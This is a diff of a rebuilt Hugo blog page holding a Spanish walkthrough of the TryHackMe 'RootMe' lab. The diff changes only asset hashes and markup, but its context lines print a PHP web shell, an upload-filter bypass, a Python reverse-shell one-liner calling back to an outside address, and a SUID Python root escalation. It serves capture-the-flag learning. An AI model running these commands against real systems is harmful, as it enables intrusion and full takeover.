@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
+<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
+<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="RootMe es una maquina de TryHackMe con dificultad Facil donde obtuvimos acceso con una shell inversa tras realizar bypass al filtro de ficheros. Encontramos a Python con permisos SUID, nos ayudo a obtener acceso como root.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.92.2" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1654,7 +1654,7 @@
 <p>Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1667,7 +1667,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Sep 10 00:43:26 2020 as: nmap -Pn -sV -o mini_scan rootme.thm</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Nmap 7.80 scan initiated Thu Sep 10 00:43:26 2020 as: nmap -Pn -sV -o mini_scan rootme.thm</span>
 Nmap scan report <span class="k">for</span> rootme.thm <span class="o">(</span>10.10.74.187<span class="o">)</span>
 Host is up <span class="o">(</span>0.31s latency<span class="o">)</span>.
 Not shown: <span class="m">998</span> closed ports
@@ -1687,7 +1687,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Utilizamos gobuster para busqueda de directorios y archivos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1696,7 +1696,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/rootme$ gobuster dir -u http://rootme.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/rootme$ gobuster dir -u http://rootme.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t <span class="m">25</span> -x php,html,txt
 /css <span class="o">(</span>Status: 301<span class="o">)</span>
 /index.php <span class="o">(</span>Status: 200<span class="o">)</span>
 /js <span class="o">(</span>Status: 301<span class="o">)</span>
@@ -1712,10 +1712,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <img src="/images/posts/thm/rootme/Screenshot_20200909_225902.png" alt="image" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php:shell.php" data-lang="php:shell.php"><span class="cp">&lt;?php</span> <span class="k">echo</span><span class="p">(</span><span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]));</span> <span class="cp">?&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php:shell.php" data-lang="php:shell.php"><span class="cp">&lt;?php</span> <span class="k">echo</span><span class="p">(</span><span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]));</span> <span class="cp">?&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Cambiamos el nombre del archivo a <code>shell.php5</code> e intentamos nuevamente, ahora nos muestra un mensaje de que se subio exitosamente.<br />
@@ -1727,19 +1727,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Ejecutamos una shell inversa utilizando nuestra webshell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.10&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.10&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Ponemos a la escucha netcat junto a <code>rlwrap</code> en nuestra maquina (local).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">rlwrap nc -lvp <span class="m">1338</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">rlwrap nc -lvp <span class="m">1338</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Logramos obtener una shell con el usuario <code>www-data</code>.<br />
@@ -1750,7 +1750,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Hacemos una pequeña enumeracion de binarios <code>SUID</code> y vemos a <code>python</code> en la lista.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1779,7 +1779,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">bash-4.4$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.4$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
 -rwsr-xr-x <span class="m">1</span> root   root             31K Aug <span class="m">11</span>  <span class="m">2016</span> /bin/fusermount
 -rwsr-xr-x <span class="m">1</span> root   root             43K Jan  <span class="m">8</span>  <span class="m">2020</span> /bin/mount
@@ -1811,7 +1811,7 @@ bash-4.4$
 </div><p>Además de ello vemos en el archivo de historial de comandos que alguien utilizo <code>python</code> para ejecutar una shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1827,7 +1827,7 @@ bash-4.4$
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">bash-4.4$ cat .bash_history
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bash-4.4$ cat .bash_history
 id
 whoami
 ls
@@ -1846,10 +1846,10 @@ bash-4.4$
 </div><p>Utilizamos el comando de <a href="https://gtfobins.github.io/gtfobins/python/#suid"><strong>GTFOBins - Python</strong></a> para ejecutar una shell como usuario root.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/python -c <span class="s1">&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Logramos obtener nuestra shell y nuestra flag <code>root.txt</code>.<br />
@@ -2145,7 +2145,7 @@ bash-4.4$
 </div>
 
 
-<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
